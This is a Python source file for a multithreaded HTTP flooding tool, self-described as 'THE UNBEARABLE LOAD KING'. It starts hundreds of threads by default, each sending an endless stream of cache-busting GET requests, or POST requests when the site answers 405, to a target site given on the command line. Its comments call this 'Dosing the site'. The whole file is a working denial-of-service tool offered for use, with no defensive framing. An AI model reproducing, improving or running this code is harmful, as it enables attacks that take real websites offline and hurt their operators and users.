## imports
from load import doser
import threading
import random
import string
import sys
import re
import argparse
from banner import asciiart

## Banner printing out
def banner():
    asciiart()


## useragents and referers of the requests
def headersKey():
    with open('headersReferers.txt', 'r') as r:
        headerReferers = r.read().replace(",", '').split()
    with open('headeruseragents.txt', 'r') as r:
        headerUseragents = r.read().replace(",", '').split()
    return headerUseragents, headerReferers

## Generating random strings
def asciigen(size):
    result_str = ''.join(random.choice(string.ascii_uppercase) for i in range(size))
    return result_str

## sending requests to the site to get what method it uses
def httpcall(url):

    if '?' in url:
        param_joiner = '&'
    else:
        param_joiner = '?'
    try:
        httpcall.ping = DOS.get(url + param_joiner + asciigen(random.randint(3,10)) + '=' + asciigen(random.randint(3,10)))
        return httpcall.ping.status_code
    except Exception as e:
        print(e)

## Act according to the code recieved
def method(url):
    code = httpcall(url)
    if code == 405:
        try:
            send = DOS.post(url , data="etc")
            print("Response code from the website : ",send.status_code)
        except:
            print("Site not accepting requests")
            sys.exit()
    else:
        try:
            send = httpcall.ping
            print("Response code from the website : ",send.status_code)
        except Exception as e:
            print(e)
            sys.exit()

## Dosing the site
class Dos(threading.Thread):
    def run(self):
        try:
            while True:
                method(main.url)
        except:
            pass

## added argparse for easier user interaction
def get_parser():
    
    parser = argparse.ArgumentParser(description="THE UNBEARABLE LOAD KING")
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument(
        "-s",
        "--site",
        metavar="https://example.com",
        type=str,
        help="Site to target",
    )
    group.add_argument(
        "-t",
        "--threads",
        metavar = 500,
        type = int,
        help = "Number of threads for the program to run on"
    )
    group.add_argument(
        "-v", "--version", action="store_true", help="Show the version of this program."
    )
    parser.add_argument(
        "-q", "--quiet", action="store_true", help="Quiet mode (don't print banner)"
    )

    return parser

## main functions after the user inputs
def main():

    parser = get_parser()
    args = parser.parse_args()

    if not args.quiet:
        banner()
    
    if args.version:
        print(_version_)
    
    elif args.site:
        if args.threads:
            thread=args.threads
        else:
            thread = 500
        main.url = args.site
        for i in range(thread):
            t = Dos()
            t.start()
    else:
        parser.print_help()

if __name__ == "__main__":
    _version_ = "1.0.2"
    DOS = doser()
    main()


